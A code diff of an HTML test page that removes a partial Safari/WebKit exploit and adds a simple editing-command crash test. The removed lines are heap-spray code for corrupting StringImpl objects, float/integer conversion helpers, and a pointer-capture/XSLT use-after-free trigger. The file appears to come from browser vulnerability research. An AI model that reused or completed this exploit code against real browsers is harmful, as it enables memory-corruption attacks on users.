@@ -20,104 +20,22 @@
     new ArrayBuffer(0x1000000);
   }
 }
-let g_obj_str = {};
-function sprayStringImpl(start, end) {
-    for (let i = start; i < end; i++) {
-        let s = new String("A".repeat(0x48 - 0x14 - 5) + i.toString().padStart(5, "0"));
-        g_obj_str[s] = 0x13371337;
-    }
-}
-        let data_view = new DataView(new ArrayBuffer(8));
-        floatAsQword = float => {
-            data_view.setFloat64(0, float, true);
-            var low = data_view.getUint32(0, true);
-            var high = data_view.getUint32(4, true);
-            return low + high * 0x100000000;
-        }
 
-        qwordAsFloat = qword => {
-            data_view.setUint32(0, qword%0x100000000, true);
-            data_view.setUint32(4, qword/0x100000000, true);
-            //data_view.setBigUint64(0, qword);
-            return data_view.getFloat64(0);
-        }
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-        async function main(){
-            alert("Who does pwn my safari?");
-            h1 = document.body.appendChild(document.createElement('h1'));
-h1.textContent = 'please wait...';
-
-cache_frame = document.body.appendChild(document.createElement('iframe')) //fastmalloc object
-cache_frame.style.display = 'none';
-pi = cache_frame.contentDocument.appendChild(
-    document.createProcessingInstruction('xml-stylesheet',
-        'type="text/xml" href="stylesheet.xml"'));
-
-setTimeout(() => {
-  h1.textContent = 'click me';
-  debugger;
-  //sprayStringImpl(0,10000)
-  document.addEventListener('lostpointercapture', () => {
-    document.write('x');
-    document.firstChild.remove();
-
-    document.appendChild(pi);
-
-    document.appendChild(document.createElement('root'))
-    document.close(); // triggers an XSLT transformation
-    //alert(tohex(cache_frame));
-
-  });
-    
-  document.addEventListener('pointerdown', (event) => {
-    sprayStringImpl(0, 10000);
-	//event.pointerId = 0x4141414141;
-    document.body.setPointerCapture(event.pointerId);
-    
-    //var arr_str = Object.getOwnPropertyNames(g_obj_str);
-	  /*
-    for (let i = arr_str.length - 1; i > 0; i--) {
-        if (arr_str[i].length > 0xff) {
-            alert(arr_str[i].length)
-            alert("[+] StringImpl corrupted successfully");
-            var g_relative_read = arr_str[i];
-            //var g_obj_str = null;
-            break;
-        }
-    }*/
-    //alert()
-    let ab = new ArrayBuffer(100);
-        let a = new Float64Array(ab.buffer);
-        
-        //event.pointerId = 
-        //document.body.releasePointerCapture(event.pointerId)
-        //gc()
-        //event.remove()
-        //var b = event.pointerId;
-        //var g_arr_ab_1 = [];
-        //g_arr_ab_1.push(b);
-        
-        //alert(tohex(event.pointerId))
-	  /*for (var i = 0; i < event.pointerId +1; i++ ) {
-            if(tohex(event.pointerId) == 0) {
-                alert(event.pointerId)
-            }
-        }*/
-	  debugger;
-	  //alert(bigint2float(0x4141414141))
-        event.pointerId = ab.buffer;
-	  //h1.textContent = 
-        alert(tohex(event.pointerId))
-        //g_arr_ab_1;
-        
-
-    
-  });
-}, 0); // enough time for the style sheet to be cached
-
-}
-        main();
+	 onload = () => {
+        let output0 = document.createElement('output');
+        document.body.appendChild(output0);
+        let h1 = document.createElement('h1');
+        output0.appendChild(h1);
+        let table0 = document.createElement('table');
+        h1.appendChild(table0);
+        table0.appendChild(document.createElement('h1'));
+        output0.appendChild(document.createElement('div'));
+        document.designMode = 'on';
+        document.execCommand('SelectAll');
+        document.execCommand('DefaultParagraphSeparator', false, 'p');
+        document.execCommand('JustifyRight');
+        document.execCommand('Undo');
+        document.write("Test passes if it does not crash.");
+    };
 </script>
 </html>
